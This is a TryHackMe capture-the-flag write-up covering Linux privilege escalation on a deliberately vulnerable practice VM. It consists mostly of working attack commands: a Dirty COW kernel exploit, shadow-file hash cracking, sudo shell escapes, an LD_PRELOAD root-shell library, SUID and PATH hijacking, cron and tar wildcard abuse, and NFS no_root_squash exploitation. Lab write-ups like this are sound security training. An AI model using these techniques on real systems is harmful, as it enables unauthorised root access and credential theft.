# Linux PrivEsc Arena – TryHackMe Writeup

## Objective
Practice multiple Linux privilege escalation techniques on a deliberately vulnerable Linux VM and obtain root through different attack vectors.

---

# Initial Access

## SSH Login
```bash
ssh TCM@<target-ip>
# password: Hacker123
```

Confirm low privileges:
```bash
id
```

---

# Kernel Exploit

## Detection
```bash
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

Vulnerable to:
```
Dirty COW
```

## Exploitation
```bash
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd
```

Root access gained.

---

# Stored Credentials

## Config Files
```bash
cat /home/user/myvpn.ovpn
cat /etc/openvpn/auth.txt
cat /home/user/.irssi/config | grep -i pass
```

Found plaintext credentials → switch to root.

---

## Bash History
```bash
cat ~/.bash_history | grep -i pass
```

Leaked passwords discovered.

---

# Weak File Permissions

## Shadow/Password Files
```bash
ls -l /etc/shadow
cat /etc/passwd
cat /etc/shadow
```

Crack hashes:
```bash
unshadow passwd shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt
```

Login with cracked credentials.

---

# SSH Key Leakage

## Detection
```bash
find / -name id_rsa 2>/dev/null
```

## Exploitation
```bash
chmod 600 id_rsa
ssh -i id_rsa root@<target-ip>
```

Root access gained.

---

# Sudo Misconfigurations

## Check permissions
```bash
sudo -l
```

---

## Shell Escapes

Examples:
```bash
sudo find / -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
sudo vim -c '!sh'
```

---

## Abusing Intended Functionality
```bash
sudo apache2 -f /etc/shadow
```

Extract hashes → crack → login.

---

## LD_PRELOAD

### Create shared object
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init(){ setgid(0); setuid(0); system("/bin/bash"); }
```

Compile:
```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```

Root shell.

---

# SUID Exploits

## Find binaries
```bash
find / -type f -perm -04000 2>/dev/null
```

---

## Shared Object Injection
```bash
gcc -shared -fPIC -o ~/.config/libcalc.so libcalc.c
/usr/local/bin/suid-so
```

---

## PATH Hijacking
```bash
gcc service.c -o service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```

---

## Bash Function Abuse
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

---

# Capabilities Abuse

## Detection
```bash
getcap -r / 2>/dev/null
```

Found:
```
cap_setuid
```

## Exploit
```bash
python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

# Cron Job Exploits

## PATH Manipulation
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > ~/overwrite.sh
chmod +x overwrite.sh
```

Wait → execute:
```bash
/tmp/bash -p
```

---

## Wildcards
```bash
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=runme.sh
```

---

## File Overwrite
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```

---

# NFS Root Squashing Disabled

## Detection
```bash
cat /etc/exports
```

Found:
```
no_root_squash
```

## Exploit
```bash
mount <target-ip>:/tmp /tmp/nfs
gcc x.c -o /tmp/nfs/x
chmod +s /tmp/nfs/x
/tmp/x
```

Root shell obtained.

---

# Techniques Practiced

- Kernel exploits (Dirty COW)
- Credential leaks
- Weak permissions
- SSH key abuse
- Sudo misconfigs
- LD_PRELOAD
- SUID injection
- PATH hijacking
- Capabilities abuse
- Cron job exploitation
- NFS no_root_squash

---

✅ Room completed successfully
